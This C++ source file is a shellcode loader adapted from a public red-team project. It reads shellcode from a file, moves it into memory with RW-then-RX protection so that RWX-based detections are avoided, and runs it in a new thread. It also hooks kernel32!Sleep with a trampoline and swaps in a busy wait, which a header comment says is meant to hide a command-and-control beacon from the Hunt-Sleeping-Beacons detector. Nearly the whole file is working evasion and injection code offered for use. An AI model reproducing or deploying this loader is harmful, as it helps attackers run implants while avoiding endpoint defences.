/*
References
- https://github.com/mgeeky/ShellcodeFluctuation
- http://www.cplusplus.com/forum/beginner/74239/
- https://stackoverflow.com/questions/48009277/thread-wait-reasons

Most of this code is from mgeeky's ShellcodeFluctuation project, including the Sleep hook and shellcode exec. I just stole the busy wait
from the cplusplus forum thread replies :)

This relies on the detection being based on the DelayExecution thread state. Busy waiting does not put the thread into
DelayExecution, and hence the thread is not flagged by Hunt-Sleeping-Beacons.

*/

// mgeeky's ShellcodeFluctuation
#include "shellcodefluctuation.h"
#include <intrin.h>
#pragma once
#include <windows.h>

//http://www.cplusplus.com/forum/beginner/74239/
#include <ctime>
bool Wait(const unsigned long &Time)
{
    printf("\n[+] Busy waiting for %d milliseconds...\n",Time);
    clock_t Tick = clock_t(float(clock()) / float(CLOCKS_PER_SEC) * 1000.f);
    if(Tick < 0) // if clock() fails, it returns -1
        return 0;
    clock_t Now = clock_t(float(clock()) / float(CLOCKS_PER_SEC) * 1000.f);
    if(Now < 0)
        return 0;
    while( (Now - Tick) < Time )
    {
        Now = clock_t(float(clock()) / float(CLOCKS_PER_SEC) * 1000.f);
        if(Now < 0)
            return 0;
    }
    return 1;
}

// Declarations
HookedSleep g_hookedSleep;


#pragma intrinsic(_ReturnAddress)







// mgeeky's ShellcodeFluctuation
void WINAPI MySleep(DWORD dwMilliseconds)
{
    const LPVOID caller = (LPVOID)_ReturnAddress();



    HookTrampolineBuffers buffers = { 0 };
    buffers.originalBytes = g_hookedSleep.sleepStub;
    buffers.originalBytesSize = sizeof(g_hookedSleep.sleepStub);

    fastTrampoline(false, (BYTE*)::Sleep, (void*)&MySleep, &buffers);

    // Perform sleep emulating originally hooked functionality.
    // Busy wait!
    if(!Wait(dwMilliseconds))
    { /* Error */ }

    printf("\n==========[BEACON CALLBACK!]==========\n");


    //
    // Re-hook kernel32!Sleep
    //
    fastTrampoline(true, (BYTE*)::Sleep, (void*)&MySleep);
}

std::vector<MEMORY_BASIC_INFORMATION> collectMemoryMap(HANDLE hProcess, DWORD Type)
{
    std::vector<MEMORY_BASIC_INFORMATION> out;
    const size_t MaxSize = (sizeof(ULONG_PTR) == 4) ? ((1ULL << 31) - 1) : ((1ULL << 63) - 1);

    uint8_t* address = 0;
    while (reinterpret_cast<size_t>(address) < MaxSize)
    {
        MEMORY_BASIC_INFORMATION mbi = { 0 };

        if (!VirtualQueryEx(hProcess, address, &mbi, sizeof(mbi)))
        {
            break;
        }

        if ((mbi.Protect == PAGE_EXECUTE_READWRITE || mbi.Protect == PAGE_EXECUTE_READ || mbi.Protect == PAGE_READWRITE)
            && ((mbi.Type & Type) != 0))
        {
            out.push_back(mbi);
        }

        address += mbi.RegionSize;
    }

    return out;
}



bool fastTrampoline(bool installHook, BYTE* addressToHook, LPVOID jumpAddress, HookTrampolineBuffers* buffers)
{
#ifdef _WIN64
    uint8_t trampoline[] = {
        0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov r10, addr
        0x41, 0xFF, 0xE2                                            // jmp r10
    };

    uint64_t addr = (uint64_t)(jumpAddress);
    memcpy(&trampoline[2], &addr, sizeof(addr));
#else
    uint8_t trampoline[] = {
        0xB8, 0x00, 0x00, 0x00, 0x00,     // mov eax, addr
        0xFF, 0xE0                        // jmp eax
    };

    uint32_t addr = (uint32_t)(jumpAddress);
    memcpy(&trampoline[1], &addr, sizeof(addr));
#endif

    DWORD dwSize = sizeof(trampoline);
    DWORD oldProt = 0;
    bool output = false;

    if (installHook)
    {
        if (buffers != NULL)
        {
            if (buffers->previousBytes == nullptr || buffers->previousBytesSize == 0)
                return false;

            memcpy(buffers->previousBytes, addressToHook, buffers->previousBytesSize);
        }

        if (::VirtualProtect(
            addressToHook,
            dwSize,
            PAGE_EXECUTE_READWRITE,
            &oldProt
        ))
        {
            memcpy(addressToHook, trampoline, dwSize);
            output = true;
        }
    }
    else
    {
        if (buffers == NULL)
            return false;

        if (buffers->originalBytes == nullptr || buffers->originalBytesSize == 0)
            return false;

        dwSize = buffers->originalBytesSize;

        if (::VirtualProtect(
            addressToHook,
            dwSize,
            PAGE_EXECUTE_READWRITE,
            &oldProt
        ))
        {
            memcpy(addressToHook, buffers->originalBytes, dwSize);
            output = true;
        }
    }

    static typeNtFlushInstructionCache pNtFlushInstructionCache = NULL;
    if (!pNtFlushInstructionCache)
    {
        pNtFlushInstructionCache = (typeNtFlushInstructionCache)GetProcAddress(GetModuleHandleA("ntdll"), "NtFlushInstructionCache");
    }

    pNtFlushInstructionCache(GetCurrentProcess(), addressToHook, dwSize);


    ::VirtualProtect(
        addressToHook,
        dwSize,
        oldProt,
        &oldProt
    );

    return output;
}

bool hookSleep()
{
    HookTrampolineBuffers buffers = { 0 };
    buffers.previousBytes = g_hookedSleep.sleepStub;
    buffers.previousBytesSize = sizeof(g_hookedSleep.sleepStub);

    g_hookedSleep.origSleep = reinterpret_cast<typeSleep>(::Sleep);

    if (!fastTrampoline(true, (BYTE*)::Sleep, (void*)&MySleep, &buffers))
        return false;

    return true;
}


void runShellcode(LPVOID param)
{
    auto func = ((void(*)())param);

    // This is mgeekys shellcode exec I just reused. Thanks mgeeky!
    //
    // Jumping to shellcode. Look at the coment in injectShellcode() describing why we opted to jump
    // into shellcode in a classical manner instead of fancy hooking 
    // ntdll!RtlUserThreadStart+0x21 like in ThreadStackSpoofer example.
    //
    func();
}



bool readShellcode(const char* path, std::vector<uint8_t>& shellcode)
{
    HandlePtr file(CreateFileA(
        path,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    ), &::CloseHandle);

    if (INVALID_HANDLE_VALUE == file.get())
        return false;

    DWORD highSize;
    DWORD readBytes = 0;
    DWORD lowSize = GetFileSize(file.get(), &highSize);

    shellcode.resize(lowSize, 0);

    return ReadFile(file.get(), shellcode.data(), lowSize, &readBytes, NULL);
}

bool injectShellcode(std::vector<uint8_t>& shellcode, HandlePtr &thread)
{
    //
    // Firstly we allocate RW page to avoid RWX-based IOC detections
    //
    auto alloc = ::VirtualAlloc(
        NULL,
        shellcode.size() + 1,
        MEM_COMMIT,
        PAGE_READWRITE
    );

    if (!alloc) 
        return false;

    memcpy(alloc, shellcode.data(), shellcode.size());

    DWORD old;
    
    //
    // Then we change that protection to RX
    // 
    if (!VirtualProtect(alloc, shellcode.size() + 1, Shellcode_Memory_Protection, &old))
        return false;


    shellcode.clear();

    thread.reset(::CreateThread(
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)runShellcode,
        alloc,
        0,
        0
    ));

    return (NULL != thread.get());
}


//Main Function
int main(int argc, char** argv){

    if (argv[2] != "1")
    {
        printf("\n[+] Hooking kernel32!Sleep...");
        if (!hookSleep())
        {
            printf("\n[!] Could not hook kernel32!Sleep!");
            return 1;
        }else{
            printf("\n[!] Hooked! Busy waiting in use.");
        }
    }
    else
    {
        printf("\n[+] Beacon will not use busy waiting.");
    }

    std::vector<uint8_t> shellcode;
    if (!readShellcode(argv[1], shellcode))
    {
        printf("\n[!] Could not open shellcode file!");
        return 1;
    }

    printf("\n[+] Injecting shellcode...");

    HandlePtr thread(NULL, &::CloseHandle);
    if (!injectShellcode(shellcode, thread))
    {
        printf("\n[!] Could not inject shellcode!");
        return 1;
    }

    printf("\n[+] Shellcode is now running.");

    WaitForSingleObject(thread.get(), INFINITE);

}




